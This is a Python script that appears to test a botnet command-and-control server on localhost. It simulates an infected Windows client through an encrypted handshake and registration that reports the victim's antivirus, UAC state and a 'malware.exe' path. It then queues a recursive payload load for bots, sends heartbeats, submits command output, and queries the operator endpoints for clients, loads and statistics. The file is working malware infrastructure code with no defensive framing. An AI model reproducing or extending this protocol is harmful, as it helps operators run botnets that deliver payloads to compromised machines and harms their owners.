import requests
import json
from cryptography.hazmat.primitives import padding
from chepy import Chepy as c
from colorama import Fore
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import hashlib
import time
import rsa

import secrets
import argon2
import time
from colorama import Fore
import random
import binascii
from itertools import permutations

SERVER_ADDRESS = "http://127.0.0.1:9999"
API_SECRET = "debug"

def charsex_bytes(bytearray_input):
    return list(permutations(bytearray_input))

def encrypt_data_withkey(plaintext, key):
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext.encode('utf-8')) + padder.finalize()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    base64_encoded_ciphertext = base64.b64encode(ciphertext).decode('utf-8')
    return base64_encoded_ciphertext

def decrypt_data_withkey(base64_encoded_ciphertext, key):
    base64_decoded_ciphertext = base64.b64decode(base64_encoded_ciphertext)
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_ciphertext = decryptor.update(base64_decoded_ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(decrypted_ciphertext) + unpadder.finalize()
    return plaintext


client_bytes = secrets.token_bytes(32)
test_payload_image = open("image.png", "rb").read()

keydata = b'''
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
-----END RSA PUBLIC KEY-----
'''

rsa_client_bytes = base64.b64encode(rsa.encrypt(client_bytes, rsa.PublicKey.load_pkcs1(keydata))).decode("utf-8")
register_client = requests.post(
    SERVER_ADDRESS + "/gateway", 
    rsa_client_bytes
)

handshake_1_response = json.loads(decrypt_data_withkey(register_client.text, client_bytes).decode("utf-8"))

start_time = time.time()
server_bytes = None

print("[?] Handshake P1")
for chosen_bytes in charsex_bytes(base64.b64decode(handshake_1_response["seed"])):
    client_hasher = argon2.PasswordHasher(time_cost=16, memory_cost=2**4, parallelism=2, hash_len=32, type=argon2.low_level.Type.ID)

    try:
        client_hasher.verify(handshake_1_response["hash"], bytes(chosen_bytes))
        time_found = int(time.time() - start_time)
        server_bytes = bytes(chosen_bytes)
    except argon2.exceptions.VerifyMismatchError:
        continue
    break

encryption_key = hashlib.sha256(client_bytes + server_bytes).hexdigest()[:32].encode()

print(f"Encryption key found! ({time_found}s): ", encryption_key.decode())
print(f"{handshake_1_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

registration_payload = base64.b64encode(rsa.encrypt(encryption_key, rsa.PublicKey.load_pkcs1(keydata))).decode() + "." + encrypt_data_withkey(
    json.dumps({
        "version": 10,
        "uac": False,
        "username": secrets.token_hex(8),
        "guid": 'windows-guid',
        "cpu": "Intel i5-100k",
        "gpu": "RTX 3050",
        "ram": 16,
        "antivirus": "Windows Defender",
        "path": "C:\\Windows\\System32\\malware.exe",
        "pid": 5102,
    }),
    encryption_key
)


registration_request = requests.post(
    SERVER_ADDRESS + "/gateway", 
    registration_payload
)

time.sleep(91)

try:
    print("[?] Registration Request")
    client_id = decrypt_data_withkey(registration_request.text, encryption_key).decode()
    print(f"Client ID: {client_id}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
except:
    print(registration_request.text)
    quit()


print("[?] Issue Load")
issue_load = requests.post(
    SERVER_ADDRESS + "/api/issue_load",
    json.dumps({
        "api_secret": API_SECRET,
        "is_recursive": True,
        "cmd_type": "disk",
        "required_amount": 10,
        "cmd_args": base64.b64encode(test_payload_image).decode("utf-8")
    }),
)

print(f"Load ID: {issue_load.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")



print("[?] Heartbeat Client")
heartbeat_response = requests.post(
    SERVER_ADDRESS + "/gateway", 
    client_id + "." + encrypt_data_withkey(json.dumps({
        "action": "heartbeat",
    }), encryption_key)
)
try:
    decrypted_response = decrypt_data_withkey(heartbeat_response.text, encryption_key).decode("utf-8")
    resp_json = json.loads(decrypted_response)
    resp_json["cmd_args"] = resp_json["cmd_args"][:100] + "..."
    print(f"{resp_json}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
except:
    print(heartbeat_response.text)

if decrypted_response != "Ok":

    print("[?] Submit Output")
    submit_output = requests.post(
        SERVER_ADDRESS + "/gateway", 
        client_id + "." + encrypt_data_withkey(json.dumps({
            "action": "submit_output",
            "command_id": json.loads(decrypted_response)["command_id"],
            "output": "Completed Succesfully"
        }), encryption_key)
    )

    try:
        decrypted_response = decrypt_data_withkey(submit_output.text, encryption_key).decode("utf-8")
        print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
    except:
        print(f"{submit_output.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

# //-------------------------------------- Server Endpoints --------------------------------------\\


print("[?] Get output list for specific client")
get_client_outputs = requests.post(
    SERVER_ADDRESS + "/api/get_output",
    json.dumps({
        "api_secret": API_SECRET,
        "client_id": client_id,
    }),
)
print(f"{get_client_outputs.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")


print("[?] Get clients list")
get_clients_list = requests.post(
    SERVER_ADDRESS + "/api/clients_list",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(f"{get_clients_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Get blocks list")
get_blocks_list = requests.post(
    SERVER_ADDRESS + "/api/blocks_list",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(get_blocks_list.status_code)
print(f"{get_blocks_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Get loads list")
get_loads_List = requests.post(
    SERVER_ADDRESS + "/api/loads_list",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)
print(f"{get_loads_List.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Get Statistics")
get_statistics = requests.post(
    SERVER_ADDRESS + "/api/statistics",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(f"{get_statistics.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print(f"{Fore.GREEN}[+] All done! Every request was sent without fail. Your endpoint has no flaws.")